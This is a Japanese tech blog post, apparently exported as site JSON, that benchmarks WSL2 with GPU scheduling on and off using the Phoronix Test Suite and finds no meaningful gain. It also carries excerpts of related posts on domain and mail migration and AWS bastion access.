{"componentChunkName":"component---src-templates-post-tsx","path":"/posts/91","result":{"data":{"esaPost":{"number":91,"relative_category":"blog/backend","fields":{"title":"Hardware-Accelerated GPU Scheduling機能を使ったWSL2はどのくらいパフォーマンスが向上するか","excerpt":"新しいPC端末を購入したところ「Hardware-Accerlarated GPU Scheduling」機能があることに気づきました。使用したところ気持ち速くなったように感じたのでどのくらいパフォーマンスが向上したか調べてみました。   > PROBLEMPROBLEM \n\n- システム設定で「Hardware-Accerlarated GPU Scheduling（HAGS）」機能を使ったところWSL2のパフォーマンスが体感的に速くなったように感じた 他の端末にもHAGSを展開していきたいので実際にどのらくらいパフォーマンスが向上するか検証したい \n- 他の端末にもHAGSを展開していきたいので実際にどのらくらいパフォーマンスが向上するか検証したい  > SOLUTIONSOLUTION \n\nと言うわけで、以前Phoronixによって書かれた「WSLとWSL2とのベンチマーク比較の記事」を参考にPhoronix Test SuiteでHAGSのオン・オフのベンチマーク比較を行います。  > 検証端末の環境検証端末の環境    Item Content     Processor AMD Ryzen 9 5900X 12-Core (12 Cores / 24 Threads)   Memory 52 GB   Disk 2 x 275GB Virtual Disk   OS Ubuntu 20.04   Kernel 5.4.72-microsoft-standard-WSL2 (x86_64)   Display Server X Server   Compiler GCC 9.3.0   File System ext4   System Layer wsl     > Phoronix Test SuiteをインストールするPhoronix Test Suiteをインストールする sh\n\nbrew install phoronix-test-suite sudo apt install php php-gd php-xml php-curl   > 実行するベンチマークテストを選定する実行するベンチマークテストを選定する \n\nまず実行可能なテストとテストスーツを確認します、テストスーツは関連テストのグループになります。 sh\n\nphoronix-test-suite list-available-tests phoronix-test-suite list-available-suite  \n\n今回は開発する際に関係がある下記のテストを選定しました。テストスーツは数時間では完了しないケースがあったので今回の対象から外しています。 \n\n- pts/build-gcc\n- pts/compress-gzip\n- pts/system-decompress-gzip\n- pts/gnupg\n- pts/mutex\n- pts/openssl\n- pts/git\n- pts/pybench\n- pts/nginx\n- pts/node-web-tooling  > ベンチマーク結果ベンチマーク結果    Item HAGSオン HAGSオフ     pts/build-gcc 717.39 sec 715.56 sec   pts/compress-gzip 29.10 sec 29.36 sec   pts/system-decompress-gzip 2.397 sec 2.427 sec   pts/mutex Lock Shared 15.2 sec 15.2 sec   pts/mutex Unlock spinlock 33.1 sec 33.4 sec   pts/mutex Unlock std::mutex 14.8 sec 14.7 sec   pts/mutex Semaphore Release And Acquire 8.44 sec 8.36 sec   pts/mutex Unlock pthread_mutex 8.45 sec 8.34 sec   pts/openssl 3704.3 sign/sec 3694 sign/sec   pts/git 39.01 sec 38.85 sec   pts/pybench 869 msec 877 msec   pts/nginx 70124.29 req/sec 71919.70 req/sec   pts/node-web-tooling 16.71 sec 17.01 sec     > WRAPUPWRAPUP \n\n残念ながらベンチマーク結果からHAGSのオンとオフの間に大きなパフォーマンスの変化は見られませんでした。通常の開発の場合はほぼ恩恵を受けられないと言って問題ないでしょう。 \n\n結論として、他の端末へのHAGSの展開はお薦めしません。不具合等の口コミも散見されるので使用端末との相性を見ながら導入するのが良さそうです。個人的にはChromeのハードウェアアクセラレーション機能との相性を見つつしばらく運用しようと思います。","thumbnail":"https://img.esa.io/uploads/production/attachments/16651/2021/07/26/97367/a0d4efeb-feab-41e6-bb96-790f9fb74647.png"},"wip":false,"body_md":"新しいPC端末を購入したところ「Hardware-Accerlarated GPU Scheduling」機能があることに気づきました。使用したところ気持ち速くなったように感じたのでどのくらいパフォーマンスが向上したか調べてみました。\r\n\r\n<img width=\"1272\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/26/97367/a0d4efeb-feab-41e6-bb96-790f9fb74647.png\">\r\n\r\n# PROBLEM\r\n- システム設定で「[Hardware-Accerlarated GPU Scheduling（HAGS）](https://devblogs.microsoft.com/directx/hardware-accelerated-gpu-scheduling/)」機能を使ったところWSL2のパフォーマンスが体感的に速くなったように感じた\r\n    - 他の端末にもHAGSを展開していきたいので実際にどのらくらいパフォーマンスが向上するか検証したい\r\n\r\n# SOLUTION\r\nと言うわけで、以前Phoronixによって書かれた「[WSLとWSL2とのベンチマーク比較の記事](https://www.phoronix.com/scan.php?page=article&item=windows-10-wsl2&num=1)」を参考に[Phoronix Test Suite](https://www.phoronix-test-suite.com/)でHAGSのオン・オフのベンチマーク比較を行います。\r\n\r\n## 検証端末の環境\r\n| Item | Content |\r\n| --- | --- |\r\n| Processor | AMD Ryzen 9 5900X 12-Core (12 Cores / 24 Threads) |\r\n| Memory | 52 GB |\r\n| Disk | 2 x 275GB Virtual Disk |\r\n| OS | Ubuntu 20.04 |\r\n| Kernel | 5.4.72-microsoft-standard-WSL2 (x86_64) |\r\n| Display Server | X Server |\r\n| Compiler | GCC 9.3.0 |\r\n| File System | ext4 |\r\n| System Layer | wsl |\r\n\r\n## Phoronix Test Suiteをインストールする\r\n```sh\r\nbrew install phoronix-test-suite\r\nsudo apt install php php-gd php-xml php-curl\r\n```\r\n\r\n## 実行するベンチマークテストを選定する\r\nまず実行可能なテストとテストスーツを確認します、テストスーツは関連テストのグループになります。\r\n\r\n```sh\r\nphoronix-test-suite list-available-tests\r\nphoronix-test-suite list-available-suite\r\n```\r\n\r\n今回は開発する際に関係がある下記のテストを選定しました。テストスーツは数時間では完了しないケースがあったので今回の対象から外しています。\r\n- pts/build-gcc\r\n- pts/compress-gzip\r\n- pts/system-decompress-gzip\r\n- pts/gnupg\r\n- pts/mutex\r\n- pts/openssl\r\n- pts/git\r\n- pts/pybench\r\n- pts/nginx\r\n- pts/node-web-tooling\r\n\r\n## ベンチマーク結果\r\n| Item | HAGSオン | HAGSオフ |\r\n| --- | --- | --- |\r\n| pts/build-gcc | [717.39 sec](https://openbenchmarking.org/result/2107255-IB-TESTBUILD18) | [715.56 sec](https://openbenchmarking.org/result/2107251-IB-TESTBUILD70) |\r\n| pts/compress-gzip | [29.10 sec](https://openbenchmarking.org/result/2107257-IB-TESTCOMPR09) | [29.36 sec](https://openbenchmarking.org/result/2107257-IB-TESTCOMPR68) |\r\n| pts/system-decompress-gzip | [2.397 sec](https://openbenchmarking.org/result/2107253-IB-TESTSYSTE11) | [2.427 sec](https://openbenchmarking.org/result/2107252-IB-TESTSYSTE54) |\r\n| pts/mutex Lock Shared | [15.2 sec](https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77) | [15.2 sec](https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56) |\r\n| pts/mutex Unlock spinlock  | [33.1 sec](https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77) | [33.4 sec](https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56) |\r\n| pts/mutex Unlock std::mutex | [14.8 sec](https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77) | [14.7 sec](https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56) |\r\n| pts/mutex Semaphore Release And Acquire | [8.44 sec](https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77) | [8.36 sec](https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56) |\r\n| pts/mutex Unlock pthread_mutex | [8.45 sec](https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77) | [8.34 sec](https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56) |\r\n| pts/openssl | [3704.3 sign/sec](https://openbenchmarking.org/result/2107253-IB-TESTOPENS77) | [3694 sign/sec](https://openbenchmarking.org/result/2107253-IB-TESTOPENS59) |\r\n| pts/git | [39.01 sec](https://openbenchmarking.org/result/2107251-IB-TESTGITHA63) | [38.85 sec](https://openbenchmarking.org/result/2107250-IB-TESTGITHA82) |\r\n| pts/pybench | [869 msec](https://openbenchmarking.org/result/2107257-IB-TESTPYBEN90) | [877 msec](https://openbenchmarking.org/result/2107250-IB-TESTPYBEN63) |\r\n| pts/nginx | [70124.29 req/sec](https://openbenchmarking.org/result/2107258-IB-TESTNGINX84) | [71919.70 req/sec](https://openbenchmarking.org/result/2107255-IB-TESTNGINX60) |\r\n| pts/node-web-tooling | [16.71 sec](https://openbenchmarking.org/result/2107257-IB-TESTNODEW03) | [17.01 sec](https://openbenchmarking.org/result/2107259-IB-TESTNODEW92) |\r\n\r\n# WRAPUP\r\n残念ながらベンチマーク結果からHAGSのオンとオフの間に大きなパフォーマンスの変化は見られませんでした。通常の開発の場合はほぼ恩恵を受けられないと言って問題ないでしょう。\r\n\r\n結論として、他の端末へのHAGSの展開はお薦めしません。不具合等の口コミも散見されるので使用端末との相性を見ながら導入するのが良さそうです。個人的にはChromeのハードウェアアクセラレーション機能との相性を見つつしばらく運用しようと思います。","body_html":"<p data-sourcepos=\"1:1-1:275\">新しいPC端末を購入したところ「Hardware-Accerlarated GPU Scheduling」機能があることに気づきました。使用したところ気持ち速くなったように感じたのでどのくらいパフォーマンスが向上したか調べてみました。</p>\n<a href=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/26/97367/a0d4efeb-feab-41e6-bb96-790f9fb74647.png\" target=\"_blank\" rel=\"noopener noreferrer\"><img width=\"1272\" alt=\"thumbnail\" src=\"https://img.esa.io/uploads/production/attachments/16651/2021/07/26/97367/a0d4efeb-feab-41e6-bb96-790f9fb74647.png\"></a>\n<h1 data-sourcepos=\"5:1-5:9\" id=\"1-0-0\" name=\"1-0-0\"><a class=\"anchor\" id=\"PROBLEM\" name=\"PROBLEM\" href=\"#PROBLEM\" data-position=\"1-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"PROBLEM\"> &gt; PROBLEM</span></a>PROBLEM</h1>\n<ul data-sourcepos=\"6:1-8:0\">\n<li data-sourcepos=\"6:1-8:0\">システム設定で「<a href=\"https://devblogs.microsoft.com/directx/hardware-accelerated-gpu-scheduling/\" target=\"_blank\" rel=\"noopener noreferrer\">Hardware-Accerlarated GPU Scheduling（HAGS）</a>」機能を使ったところWSL2のパフォーマンスが体感的に速くなったように感じた\n<ul data-sourcepos=\"7:5-8:0\">\n<li data-sourcepos=\"7:5-8:0\">他の端末にもHAGSを展開していきたいので実際にどのらくらいパフォーマンスが向上するか検証したい</li>\n</ul></li>\n</ul>\n<h1 data-sourcepos=\"9:1-9:10\" id=\"2-0-0\" name=\"2-0-0\"><a class=\"anchor\" id=\"SOLUTION\" name=\"SOLUTION\" href=\"#SOLUTION\" data-position=\"2-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"SOLUTION\"> &gt; SOLUTION</span></a>SOLUTION</h1>\n<p data-sourcepos=\"10:1-10:332\">と言うわけで、以前Phoronixによって書かれた「<a href=\"https://www.phoronix.com/scan.php?page=article&amp;item=windows-10-wsl2&amp;num=1\" target=\"_blank\" rel=\"noopener noreferrer\">WSLとWSL2とのベンチマーク比較の記事</a>」を参考に<a href=\"https://www.phoronix-test-suite.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Phoronix Test Suite</a>でHAGSのオン・オフのベンチマーク比較を行います。</p>\n<h2 data-sourcepos=\"12:1-12:24\" id=\"2-1-0\" name=\"2-1-0\"><a class=\"anchor\" id=\"検証端末の環境\" name=\"検証端末の環境\" href=\"#検証端末の環境\" data-position=\"2-1-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"検証端末の環境\"> &gt; 検証端末の環境</span></a>検証端末の環境</h2>\n<table data-sourcepos=\"13:1-23:22\">\n<thead>\n<tr data-sourcepos=\"13:1-13:18\">\n<th data-sourcepos=\"13:2-13:7\">Item</th>\n<th data-sourcepos=\"13:9-13:17\">Content</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"15:1-15:65\">\n<td data-sourcepos=\"15:2-15:12\">Processor</td>\n<td data-sourcepos=\"15:14-15:64\">AMD Ryzen 9 5900X 12-Core (12 Cores / 24 Threads)</td>\n</tr>\n<tr data-sourcepos=\"16:1-16:18\">\n<td data-sourcepos=\"16:2-16:9\">Memory</td>\n<td data-sourcepos=\"16:11-16:17\">52 GB</td>\n</tr>\n<tr data-sourcepos=\"17:1-17:33\">\n<td data-sourcepos=\"17:2-17:7\">Disk</td>\n<td data-sourcepos=\"17:9-17:32\">2 x 275GB Virtual Disk</td>\n</tr>\n<tr data-sourcepos=\"18:1-18:21\">\n<td data-sourcepos=\"18:2-18:5\">OS</td>\n<td data-sourcepos=\"18:7-18:20\">Ubuntu 20.04</td>\n</tr>\n<tr data-sourcepos=\"19:1-19:52\">\n<td data-sourcepos=\"19:2-19:9\">Kernel</td>\n<td data-sourcepos=\"19:11-19:51\">5.4.72-microsoft-standard-WSL2 (x86_64)</td>\n</tr>\n<tr data-sourcepos=\"20:1-20:29\">\n<td data-sourcepos=\"20:2-20:17\">Display Server</td>\n<td data-sourcepos=\"20:19-20:28\">X Server</td>\n</tr>\n<tr data-sourcepos=\"21:1-21:24\">\n<td data-sourcepos=\"21:2-21:11\">Compiler</td>\n<td data-sourcepos=\"21:13-21:23\">GCC 9.3.0</td>\n</tr>\n<tr data-sourcepos=\"22:1-22:22\">\n<td data-sourcepos=\"22:2-22:14\">File System</td>\n<td data-sourcepos=\"22:16-22:21\">ext4</td>\n</tr>\n<tr data-sourcepos=\"23:1-23:22\">\n<td data-sourcepos=\"23:2-23:15\">System Layer</td>\n<td data-sourcepos=\"23:17-23:21\">wsl</td>\n</tr>\n</tbody>\n</table>\n<h2 data-sourcepos=\"25:1-25:49\" id=\"2-2-0\" name=\"2-2-0\"><a class=\"anchor\" id=\"Phoronix Test Suiteをインストールする\" name=\"Phoronix Test Suiteをインストールする\" href=\"#Phoronix Test Suiteをインストールする\" data-position=\"2-2-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"Phoronix Test Suiteをインストールする\"> &gt; Phoronix Test Suiteをインストールする</span></a>Phoronix Test Suiteをインストールする</h2>\n<div class=\"code-block\" data-sourcepos=\"26:1-29:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code>brew <span class=\"nb\">install </span>phoronix-test-suite\n<span class=\"nb\">sudo </span>apt <span class=\"nb\">install </span>php php-gd php-xml php-curl\n</code></pre></div></div>\n<h2 data-sourcepos=\"31:1-31:57\" id=\"2-3-0\" name=\"2-3-0\"><a class=\"anchor\" id=\"実行するベンチマークテストを選定する\" name=\"実行するベンチマークテストを選定する\" href=\"#実行するベンチマークテストを選定する\" data-position=\"2-3-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"実行するベンチマークテストを選定する\"> &gt; 実行するベンチマークテストを選定する</span></a>実行するベンチマークテストを選定する</h2>\n<p data-sourcepos=\"32:1-32:141\">まず実行可能なテストとテストスーツを確認します、テストスーツは関連テストのグループになります。</p>\n<div class=\"code-block\" data-sourcepos=\"34:1-37:3\"><div class=\"code-filename\"><i class=\"fa fa-file-code-o\"></i>sh</div><div class=\"highlight\"><pre class=\"highlight shell\"><code>phoronix-test-suite list-available-tests\nphoronix-test-suite list-available-suite\n</code></pre></div></div>\n<p data-sourcepos=\"39:1-39:204\">今回は開発する際に関係がある下記のテストを選定しました。テストスーツは数時間では完了しないケースがあったので今回の対象から外しています。</p>\n<ul data-sourcepos=\"40:1-50:0\">\n<li data-sourcepos=\"40:1-40:15\">pts/build-gcc</li>\n<li data-sourcepos=\"41:1-41:19\">pts/compress-gzip</li>\n<li data-sourcepos=\"42:1-42:28\">pts/system-decompress-gzip</li>\n<li data-sourcepos=\"43:1-43:11\">pts/gnupg</li>\n<li data-sourcepos=\"44:1-44:11\">pts/mutex</li>\n<li data-sourcepos=\"45:1-45:13\">pts/openssl</li>\n<li data-sourcepos=\"46:1-46:9\">pts/git</li>\n<li data-sourcepos=\"47:1-47:13\">pts/pybench</li>\n<li data-sourcepos=\"48:1-48:11\">pts/nginx</li>\n<li data-sourcepos=\"49:1-50:0\">pts/node-web-tooling</li>\n</ul>\n<h2 data-sourcepos=\"51:1-51:27\" id=\"2-4-0\" name=\"2-4-0\"><a class=\"anchor\" id=\"ベンチマーク結果\" name=\"ベンチマーク結果\" href=\"#ベンチマーク結果\" data-position=\"2-4-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"ベンチマーク結果\"> &gt; ベンチマーク結果</span></a>ベンチマーク結果</h2>\n<table data-sourcepos=\"52:1-66:172\">\n<thead>\n<tr data-sourcepos=\"52:1-52:34\">\n<th data-sourcepos=\"52:2-52:7\">Item</th>\n<th data-sourcepos=\"52:9-52:20\">HAGSオン</th>\n<th data-sourcepos=\"52:22-52:33\">HAGSオフ</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"54:1-54:167\">\n<td data-sourcepos=\"54:2-54:16\">pts/build-gcc</td>\n<td data-sourcepos=\"54:18-54:91\"><a href=\"https://openbenchmarking.org/result/2107255-IB-TESTBUILD18\" target=\"_blank\" rel=\"noopener noreferrer\">717.39 sec</a></td>\n<td data-sourcepos=\"54:93-54:166\"><a href=\"https://openbenchmarking.org/result/2107251-IB-TESTBUILD70\" target=\"_blank\" rel=\"noopener noreferrer\">715.56 sec</a></td>\n</tr>\n<tr data-sourcepos=\"55:1-55:169\">\n<td data-sourcepos=\"55:2-55:20\">pts/compress-gzip</td>\n<td data-sourcepos=\"55:22-55:94\"><a href=\"https://openbenchmarking.org/result/2107257-IB-TESTCOMPR09\" target=\"_blank\" rel=\"noopener noreferrer\">29.10 sec</a></td>\n<td data-sourcepos=\"55:96-55:168\"><a href=\"https://openbenchmarking.org/result/2107257-IB-TESTCOMPR68\" target=\"_blank\" rel=\"noopener noreferrer\">29.36 sec</a></td>\n</tr>\n<tr data-sourcepos=\"56:1-56:178\">\n<td data-sourcepos=\"56:2-56:29\">pts/system-decompress-gzip</td>\n<td data-sourcepos=\"56:31-56:103\"><a href=\"https://openbenchmarking.org/result/2107253-IB-TESTSYSTE11\" target=\"_blank\" rel=\"noopener noreferrer\">2.397 sec</a></td>\n<td data-sourcepos=\"56:105-56:177\"><a href=\"https://openbenchmarking.org/result/2107252-IB-TESTSYSTE54\" target=\"_blank\" rel=\"noopener noreferrer\">2.427 sec</a></td>\n</tr>\n<tr data-sourcepos=\"57:1-57:171\">\n<td data-sourcepos=\"57:2-57:24\">pts/mutex Lock Shared</td>\n<td data-sourcepos=\"57:26-57:97\"><a href=\"https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77\" target=\"_blank\" rel=\"noopener noreferrer\">15.2 sec</a></td>\n<td data-sourcepos=\"57:99-57:170\"><a href=\"https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56\" target=\"_blank\" rel=\"noopener noreferrer\">15.2 sec</a></td>\n</tr>\n<tr data-sourcepos=\"58:1-58:176\">\n<td data-sourcepos=\"58:2-58:29\">pts/mutex Unlock spinlock</td>\n<td data-sourcepos=\"58:31-58:102\"><a href=\"https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77\" target=\"_blank\" rel=\"noopener noreferrer\">33.1 sec</a></td>\n<td data-sourcepos=\"58:104-58:175\"><a href=\"https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56\" target=\"_blank\" rel=\"noopener noreferrer\">33.4 sec</a></td>\n</tr>\n<tr data-sourcepos=\"59:1-59:177\">\n<td data-sourcepos=\"59:2-59:30\">pts/mutex Unlock std::mutex</td>\n<td data-sourcepos=\"59:32-59:103\"><a href=\"https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77\" target=\"_blank\" rel=\"noopener noreferrer\">14.8 sec</a></td>\n<td data-sourcepos=\"59:105-59:176\"><a href=\"https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56\" target=\"_blank\" rel=\"noopener noreferrer\">14.7 sec</a></td>\n</tr>\n<tr data-sourcepos=\"60:1-60:189\">\n<td data-sourcepos=\"60:2-60:42\">pts/mutex Semaphore Release And Acquire</td>\n<td data-sourcepos=\"60:44-60:115\"><a href=\"https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77\" target=\"_blank\" rel=\"noopener noreferrer\">8.44 sec</a></td>\n<td data-sourcepos=\"60:117-60:188\"><a href=\"https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56\" target=\"_blank\" rel=\"noopener noreferrer\">8.36 sec</a></td>\n</tr>\n<tr data-sourcepos=\"61:1-61:180\">\n<td data-sourcepos=\"61:2-61:33\">pts/mutex Unlock pthread_mutex</td>\n<td data-sourcepos=\"61:35-61:106\"><a href=\"https://openbenchmarking.org/result/2107253-IB-TESTMUTEX77\" target=\"_blank\" rel=\"noopener noreferrer\">8.45 sec</a></td>\n<td data-sourcepos=\"61:108-61:179\"><a href=\"https://openbenchmarking.org/result/2107250-IB-TESTMUTEX56\" target=\"_blank\" rel=\"noopener noreferrer\">8.34 sec</a></td>\n</tr>\n<tr data-sourcepos=\"62:1-62:173\">\n<td data-sourcepos=\"62:2-62:14\">pts/openssl</td>\n<td data-sourcepos=\"62:16-62:94\"><a href=\"https://openbenchmarking.org/result/2107253-IB-TESTOPENS77\" target=\"_blank\" rel=\"noopener noreferrer\">3704.3 sign/sec</a></td>\n<td data-sourcepos=\"62:96-62:172\"><a href=\"https://openbenchmarking.org/result/2107253-IB-TESTOPENS59\" target=\"_blank\" rel=\"noopener noreferrer\">3694 sign/sec</a></td>\n</tr>\n<tr data-sourcepos=\"63:1-63:159\">\n<td data-sourcepos=\"63:2-63:10\">pts/git</td>\n<td data-sourcepos=\"63:12-63:84\"><a href=\"https://openbenchmarking.org/result/2107251-IB-TESTGITHA63\" target=\"_blank\" rel=\"noopener noreferrer\">39.01 sec</a></td>\n<td data-sourcepos=\"63:86-63:158\"><a href=\"https://openbenchmarking.org/result/2107250-IB-TESTGITHA82\" target=\"_blank\" rel=\"noopener noreferrer\">38.85 sec</a></td>\n</tr>\n<tr data-sourcepos=\"64:1-64:161\">\n<td data-sourcepos=\"64:2-64:14\">pts/pybench</td>\n<td data-sourcepos=\"64:16-64:87\"><a href=\"https://openbenchmarking.org/result/2107257-IB-TESTPYBEN90\" target=\"_blank\" rel=\"noopener noreferrer\">869 msec</a></td>\n<td data-sourcepos=\"64:89-64:160\"><a href=\"https://openbenchmarking.org/result/2107250-IB-TESTPYBEN63\" target=\"_blank\" rel=\"noopener noreferrer\">877 msec</a></td>\n</tr>\n<tr data-sourcepos=\"65:1-65:175\">\n<td data-sourcepos=\"65:2-65:12\">pts/nginx</td>\n<td data-sourcepos=\"65:14-65:93\"><a href=\"https://openbenchmarking.org/result/2107258-IB-TESTNGINX84\" target=\"_blank\" rel=\"noopener noreferrer\">70124.29 req/sec</a></td>\n<td data-sourcepos=\"65:95-65:174\"><a href=\"https://openbenchmarking.org/result/2107255-IB-TESTNGINX60\" target=\"_blank\" rel=\"noopener noreferrer\">71919.70 req/sec</a></td>\n</tr>\n<tr data-sourcepos=\"66:1-66:172\">\n<td data-sourcepos=\"66:2-66:23\">pts/node-web-tooling</td>\n<td data-sourcepos=\"66:25-66:97\"><a href=\"https://openbenchmarking.org/result/2107257-IB-TESTNODEW03\" target=\"_blank\" rel=\"noopener noreferrer\">16.71 sec</a></td>\n<td data-sourcepos=\"66:99-66:171\"><a href=\"https://openbenchmarking.org/result/2107259-IB-TESTNODEW92\" target=\"_blank\" rel=\"noopener noreferrer\">17.01 sec</a></td>\n</tr>\n</tbody>\n</table>\n<h1 data-sourcepos=\"68:1-68:8\" id=\"3-0-0\" name=\"3-0-0\"><a class=\"anchor\" id=\"WRAPUP\" name=\"WRAPUP\" href=\"#WRAPUP\" data-position=\"3-0-0\"><i class=\"fa fa-link\"></i><span class=\"hidden\" data-text=\"WRAPUP\"> &gt; WRAPUP</span></a>WRAPUP</h1>\n<p data-sourcepos=\"69:1-69:247\">残念ながらベンチマーク結果からHAGSのオンとオフの間に大きなパフォーマンスの変化は見られませんでした。通常の開発の場合はほぼ恩恵を受けられないと言って問題ないでしょう。</p>\n<p data-sourcepos=\"71:1-71:346\">結論として、他の端末へのHAGSの展開はお薦めしません。不具合等の口コミも散見されるので使用端末との相性を見ながら導入するのが良さそうです。個人的にはChromeのハードウェアアクセラレーション機能との相性を見つつしばらく運用しようと思います。</p>\n","tags":["wsl2","hags","windows-10"],"updated_at":"2021-08-15T01:37:49+09:00","childPublishedDate":{"published_on":"2021-08-01T00:00:00.000Z"},"updated_by":{"name":"なびの👷","screen_name":"nabinno","icon":"https://img.esa.io/uploads/production/members/94286/icon/thumb_m_ef5f024307008aa399b91f87fa5f64e8.jpg"}},"relatedPosts":{"edges":[{"node":{"number":137,"relative_category":"blog/backend","fields":{"title":"G Suite無償版停止に伴い、MXレコード等のドメイン管理を整理した","excerpt":"今回は10年以上利用していたG Suite無償版が2022年8月に停止されるとのことで、メールアドレスの管理をどうするか検討しました。メール管理は別のGMailアカウントを使っていたので、転送できれば良いのですが、これを機にドメイン管理をAWSにまとめていくことを思いつきました。   > PROBLEMPROBLEM \n\n- 10年以上利用していたG Suite無償版が2022年8月に停止され、メールアドレスの管理をどうしようか Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう \n- Google Workspaceにアップグレードしても良いけどBusiness Starterプランにしても面白みがないので別の方法を探したい G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう \n- G Suiteはメールしか利用しておらず、メール管理は別のGMailアカウントを使っていたのでメール転送機能で代替できそう  > SOLUTIONSOLUTION \n\nと言うわけで、今回はG Suiteアカウントの利用を止めて、MXレコード周りを整理することにしました。個人利用なのでドメイン管理は既存のままで良かったのですが、証跡管理のない状況に耐えられずAWSに移管。メール転送機能はPOBOX以外はサブアドレス対応していなかったのですが、キャッチオール対応できるのでまずは良しとしています。現時点での構成は下記の通り。 \n\nなお、複数人数で必要になった場合は、サブアドレスとグループアドレスが対応可能なAmazon Workmailに移管する予定ですが、これでもGoogle Workspaceを利用するよりコストは半分程で済みます。  > 構成構成  > beforebefore \n\n- ドメイン管理 バリュードメイン\n- MXレコード G Suite\n- SMTP G Suite  > afterafter \n\n- ドメイン管理 Amazon Route 53\n- MXレコード Cloudflare Email Routing\n- SMTP Amazon SES  > 手順手順 \n\n方針が決まるまでいくつかメールサービスを検討したのですが、決まってしまえばやることは単純です。  > 1. ドメイン管理を整理する1. ドメイン管理を整理する \n\n基本はドメイン移管申請ですが、G Suiteを後ほど削除することを考慮してMXレコードをCloudflare Email Routingに変更。本来はこの処理の前にG Suiteに紐付いている各サービスの設定変更が必要になります。 \n\n1. 移管元にてWHOIS情報公開代行の解除\n2. 移管元にてドメインロックの解除\n3. 移管元にて認証鍵 (Auth-Code) を確認\n4. 移管先にてホストゾーンの作成、各レコードの内容を移管元に合わせる\n5. Cloudflare Email Routingにて転送先メールアドレスを検証する\n6. 移管先にてMXレコードをCloudflare Email Routingのものを設定する\n7. 移管元のNSレコードを移管先に変更\n8. 移管先にて認証鍵をつかい移管申請を行う\n9. 移管元に対して移管申請を行った旨をメールにて連携する \n\nCf. \n\n- ドメインの他社への移管 | バリュードメイン ユーザーガイド\n- ドメイン登録の Amazon Route 53 への移管 - Amazon Route 53\n- Easily creating and routing email addresses with Cloudflare Email Routing  > 2. SMTPを設定する2. SMTPを設定する \n\n最近はセキュリティ対策のためGMailのSMTPが使いづらくなっているので、今回はAmazon SESを利用しました。サンドボックス解除のため下記の通りサポートに依頼しました。 txt\n\n# メールタイプ 通例の取引がメインとなる予定です # ユースケース ## メールを送信する頻度 週に1-2回 ## 受信者リストのメンテナンス方法 四半期に一度の棚卸し ## バウンス対応 当該メールアドレスの削除 ## 申し立て対応 当該メールアドレスへのフラグ管理 ## 解除申請の管理方法 メールでの受付 ## 送信予定のメールサンプル {{宛先名}}様 お世話になっております。 表題の件につきまして1点問い合わせします。 {{問い合わせ内容}} ご不明な点等ございましたらお気軽にお問い合わせ下さい。 どうぞ、よろしくお願い致します。   > 3. G Suiteを退会する3. G Suiteを退会する \n\nG Suiteに依存しているサービスがないか確認し、退会します。  > WRAPUPWRAPUP \n\n以前からドメイン管理をAWSに移管したかったのですが、積極的な理由がないためなおざりになっていました。今回のG Suite無償版の期限切れに伴い整理できすっきりしたので、これを機にいろいろ整理していきたいですね。"},"name":"[2022-04-12]G Suite無償版停止に伴い、MXレコード等のドメイン管理を整理した","tags":[],"childPublishedDate":{"published_on":"2022-04-12T00:00:00.000Z","published_on_unix":1649721600}}},{"node":{"number":119,"relative_category":"blog/backend","fields":{"title":"踏み台をSSM Session ManagerとAWS SSOで実現する","excerpt":"踏み台のユーザーが増えてきたため公開鍵管理や監視と運用負荷が上がってきました。オペミスが発生しやすい上 監査的な意味で無視できない状況になってきたので重い腰を上げることにしました。   > PROBLEMPROBLEM \n\n- EC2インスタンスの踏み台運用がつらい 公開鍵管理がつらい 提出・設定・確認ともに運用コストがかかる AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する 監視運用がつらい 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる 踏み台アクセスへの監査ログが不十分 \n- 公開鍵管理がつらい 提出・設定・確認ともに運用コストがかかる AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する \n- 提出・設定・確認ともに運用コストがかかる\n- AWSアカウント数 x ユーザー数で指数関数的に運用コストが増していくことが想定される\n- インフラ管理が分散していると、提出側・設定側ともに重複コストが発生する\n- 監視運用がつらい 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる 踏み台アクセスへの監査ログが不十分 \n- 定期的に踏み台がブルートフォース攻撃を受けており、脅威が低いとは言えストレスがかかる\n- 踏み台アクセスへの監査ログが不十分  > SOLUTIONSOLUTION 